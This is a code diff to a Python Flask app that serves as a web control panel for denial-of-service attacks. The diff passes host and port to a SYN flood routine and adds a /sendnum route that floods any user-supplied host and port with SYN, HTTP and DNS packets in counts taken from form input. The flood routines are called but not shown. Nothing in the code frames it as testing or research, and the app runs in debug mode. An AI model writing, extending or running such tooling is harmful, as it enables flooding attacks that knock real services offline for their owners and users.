@@ -64,11 +64,11 @@ def Choose_Ddos():
         global pooltmp
         try:
             for i in range(2):
-                pooltmp.apply_async(synFlood)
+                pooltmp.apply_async(synFlood, args = (host, port,))
         except ValueError:
             pooltmp = Pool(4)
             for i in range(2):
-                pooltmp.apply_async(synFlood)
+                pooltmp.apply_async(synFlood, args = (host, port,))
     return render_template('ddos.html')
 
 
@@ -128,6 +128,51 @@ def stopddos():
         pooltmp.terminate()
 
     return ""
+
+@app.route('/packagenum',methods=['GET','POST'])
+def packagenum():
+    return render_template('packagenum.html')
+
+@app.route('/sendnum',methods=['GET','POST'])
+def sendnum():
+    if(request.method == "POST"):
+        if request.form["Goodorder"] == "true":
+            if request.form["HTTPck"] == "true":
+                scapy_http(host = request.form["host"], port = int(request.form["port"]), num = int(request.form["HTTPnum"]))
+            if request.form["DNSck"] == "true":
+                dns_packets(dsthost = request.form["host"], qdcount = int(int(request.form["DNSnum"])))
+            synFlood(tgt = request.form["host"], dport = int(request.form["port"]), num = int(request.form["DDOSnum"]))
+        else:
+            num1 = 0
+            num2 = 0
+            if request.form["HTTPck"] == "true":
+                num1 = int(request.form["HTTPnum"])
+            if request.form["DNSck"] == "true":
+                num2 = int(request.form["DNSnum"])
+            num3 = int(request.form["DDOSnum"])
+            print(num1, num2, num3)
+            while True:
+                if num1 > 0:
+                    scapy_http(host = request.form["host"], port = int(request.form["port"]), num = 1)
+                    num1 = num1 - 1
+                if num2 > 0:
+                    dns_packets(dsthost = request.form["host"], qdcount = 1)
+                    num2 = num2 - 1
+                num3 = num3 - 1
+                synFlood(tgt = request.form["host"], dport = int(request.form["port"]), num = 1)
+                if num1 == 0 and num2 ==0 and num3 == 0:
+                    break
+    return ""
+
+
+@app.route('/packageflow',methods=['GET','POST'])
+def packageflow():
+    return render_template('packageflow.html')
+
+
+@app.route('/packagefre',methods=['GET','POST'])
+def packagefre():
+    return render_template('packagefre.html')
 
 if __name__ == "__main__":
     app.run(debug = True)
